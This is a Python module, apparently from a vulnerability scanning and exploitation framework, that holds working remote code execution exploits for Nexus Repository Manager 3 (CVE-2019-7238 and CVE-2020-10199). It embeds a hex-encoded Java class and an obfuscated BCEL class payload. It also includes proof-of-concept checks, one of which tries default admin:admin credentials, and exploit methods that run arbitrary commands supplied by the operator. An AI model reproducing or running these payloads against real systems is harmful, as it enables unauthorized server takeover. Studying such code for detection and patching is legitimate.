#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import base64
from thirdparty import requests
import threading
from module import globals
from core.verify import verify
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class Nexus():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.payload_cve_2019_7238 = "{\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{" \
                                     "\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\":" \
                                     " \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c" \
                                     ", integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe00" \
                                     "00003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a00620" \
                                     "0630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00" \
                                     "700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007" \
                                     "e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c65010012" \
                                     "4c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b0100047465737" \
                                     "4010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b" \
                                     "0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a617" \
                                     "6612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b01000672657375" \
                                     "6c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b01000" \
                                     "56669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e" \
                                     "7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c64010005746" \
                                     "1626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e" \
                                     "6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e7" \
                                     "3650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c6554" \
                                     "7970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536" \
                                     "f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c00" \
                                     "8a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116" \
                                     "a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099" \
                                     "009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a617" \
                                     "6612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c" \
                                     "009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e487474704" \
                                     "36f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00" \
                                     "a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e7365010009676574577" \
                                     "2697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f54657374" \
                                     "3233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a6765745" \
                                     "2756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e67" \
                                     "2f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f636573730100077" \
                                     "7616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e707574537472" \
                                     "65616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b424" \
                                     "9492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e745468726561640100142829" \
                                     "4c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294" \
                                     "c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f53" \
                                     "7472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c65637" \
                                     "42f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f" \
                                     "626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790" \
                                     "100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f" \
                                     "626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e6" \
                                     "72f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c730100" \
                                     "15284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f53747" \
                                     "2696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100" \
                                     "186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626" \
                                     "a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010005777269746501" \
                                     "0005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002" \
                                     "a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb8" \
                                     "00022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120" \
                                     "b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6" \
                                     "001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003" \
                                     "e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a7" \
                                     "0009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001" \
                                     "db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b6" \
                                     "00241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001" \
                                     "f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a500" \
                                     "3200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb00400111004101180" \
                                     "0420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000" \
                                     "000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004" \
                                     "200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00" \
                                     "c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb00430" \
                                     "04b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e300420051" \
                                     "0008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005" \
                                     "300010054000000020055';   y=0;   z='';   while (y lt x.length()){   z += c.toChars(integer.parseInt(x.s" \
                                     "ubstring(y, y+2), 16))[0];   y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass." \
                                     "getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader'" \
                                     ").invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.cl" \
                                     "ass,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentTy" \
                                     "pe()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\ny,\\n   'Exploit.Test234',\\nz.get" \
                                     "Bytes('latin1'),0,\\n3054\\n);x.getMethod('test', ''.class).invoke(null, 'RECOMMAND');'done!'}\\n\"}, {" \
                                     "\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAsset" \
                                     "s\"}"
        self.payload_cve_2020_10199 = """{"name":"internal","online":true,"storage":{"blobStoreName":"default","st""" \
                                      """rictContentTypeValidation":true},"group":{"memberNames":["${''.getClass().forName('com.sun.org.apac""" \
                                      """he.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7""" \
                                      """f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q""" \
                                      """$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$""" \
                                      """R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41""" \
                                      """$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$""" \
                                      """_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$8""" \
                                      """2$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a""" \
                                      """$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4""" \
                                      """m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$s""" \
                                      """c$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2""" \
                                      """v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$z""" \
                                      """NM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D""" \
                                      """$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3""" \
                                      """$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb""" \
                                      """$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5""" \
                                      """$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$I""" \
                                      """S$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd""" \
                                      """$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c""" \
                                      """$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$""" \
                                      """daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59""" \
                                      """$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0""" \
                                      """t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7""" \
                                      """$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$""" \
                                      """7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_""" \
                                      """$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b""" \
                                      """0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$x""" \
                                      """o$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$""" \
                                      """95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$""" \
                                      """c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c""" \
                                      """0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c""" \
                                      """3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f""" \
                                      """5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d""" \
                                      """8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf""" \
                                      """$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$""" \
                                      """aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$""" \
                                      """dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$""" \
                                      """81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4""" \
                                      """$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k""" \
                                      """$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$""" \
                                      """3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$""" \
                                      """e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$""" \
                                      """d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm""" \
                                      """$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6""" \
                                      """$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3""" \
                                      """d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed""" \
                                      """$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]}}"""

    def cve_2019_7238_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Nexus Repository Manager: CVE-2019-7238"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Nexus Repository Manager 3 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2019-7238"
        self.vul_info["vul_apps"] = "Nexus"
        self.vul_info["vul_date"] = "2019-03-21"
        self.vul_info["vul_vers"] = "3.6.2 - 3.14.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能，" \
                                    "而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞"
        self.vul_info["cre_date"] = "2021-01-27"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_cve_2019_7238.replace("RECOMMAND", cmd)
        self.headers = {
            'Accept': '*/*',
            'User-agent': self.ua,
            'Content-Type': 'application/json'
        }
        try:
            request = requests.post(self.url + "/service/extdirect", data=self.payload, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            if md in request.text:
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = cmd
                self.vul_info["prt_info"] = "[rce] [payload: " + cmd + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2019_7238_exp(self, cmd):
        vul_name = "Nexus Repository Manager: CVE-2019-7238"
        self.payload = self.payload_cve_2019_7238.replace("RECOMMAND", cmd)
        self.headers = {
            'Accept': '*/*',
            'User-agent': self.ua,
            'Content-Type': 'application/json'
        }
        try:
            request = requests.post(self.url + "/service/extdirect", data=self.payload, headers=self.headers,
                                             timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2020_10199_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Nexus Repository Manager: CVE-2020-10199"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Nexus Repository Manager 3 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2020-10199"
        self.vul_info["vul_apps"] = "Nexus"
        self.vul_info["vul_date"] = "20120-04-01"
        self.vul_info["vul_vers"] = "3.x <= 3.21.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "在 Nexus Repository Manager OSS/Pro 3.21.1 及之前的版本中，由于某处功能安全处理不当，" \
                                    "导致经过授权认证的攻击者，可以在远程通过构造恶意的 HTTP 请求，在服务端执行任意恶意代码，获取系统权限。 "
        self.vul_info["cre_date"] = "2021-01-27"
        self.vul_info["cre_auth"] = "zhzyker"
        self.session_headers = {
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Nexus-UI': 'true',
            'User-Agent': self.ua
        }
        md = random_md5()
        cmd = "echo " + md
        try:
            self.us = base64.b64encode(str.encode("admin"))
            self.pa = base64.b64encode(str.encode("admin"))
            self.base64user = self.us.decode('ascii')
            self.base64pass = self.pa.decode('ascii')
            self.session_data = {'username': self.base64user, 'password': self.base64pass}
            self.request = requests.post(self.url + "/service/rapture/session", data=self.session_data,
                                         headers=self.session_headers, timeout=20)
            self.session_str = str(self.request.headers)
            self.session = (re.search(r"NXSESSIONID=(.*); Path", self.session_str).group(1))
            self.rce_headers = {
                'Connection': "keep-alive",
                'NX-ANTI-CSRF-TOKEN': "0.6153568974227819",
                'X-Requested-With': "XMLHttpRequest",
                'X-Nexus-UI': "true",
                'Content-Type': "application/json",
                '404': "" + cmd + "",
                'User-Agent': self.ua,
                'Cookie': "jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520;" \
                          "NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=" + self.session + ""
            }
            request = requests.post(self.url + "/service/rest/beta/repositories/go/group",
                                         data=self.payload_cve_2020_10199, headers=self.rce_headers)
            if md in request.text:
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = cmd
                self.vul_info["prt_info"] = "[rce] [admin:admin] [payload: " + cmd + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_10199_exp(self, cmd, u, p):
        vul_name = "Nexus Repository Manager: CVE-2020-10199"
        self.session_headers = {
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Nexus-UI': 'true',
            'User-Agent': self.ua
        }
        try:
            self.us = base64.b64encode(str.encode(u))
            self.pa = base64.b64encode(str.encode(p))
            self.base64user = self.us.decode('ascii')
            self.base64pass = self.pa.decode('ascii')
            self.session_data = {'username': self.base64user, 'password': self.base64pass}
            self.request = requests.post(self.url + "/service/rapture/session", data=self.session_data,
                                         headers=self.session_headers, timeout=20)
            self.session_str = str(self.request.headers)
            self.session = (re.search(r"NXSESSIONID=(.*); Path", self.session_str).group(1))
            self.rce_headers = {
                'Connection': "keep-alive",
                'NX-ANTI-CSRF-TOKEN': "0.6153568974227819",
                'X-Requested-With': "XMLHttpRequest",
                'X-Nexus-UI': "true",
                'Content-Type': "application/json",
                '404': "" + cmd + "",
                'User-Agent': self.ua,
                'Cookie': "jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520;" \
                          "NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=" + self.session + ""
            }
            request = requests.post(self.url + "/service/rest/beta/repositories/go/group",
                                         data=self.payload_cve_2020_10199, headers=self.rce_headers)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)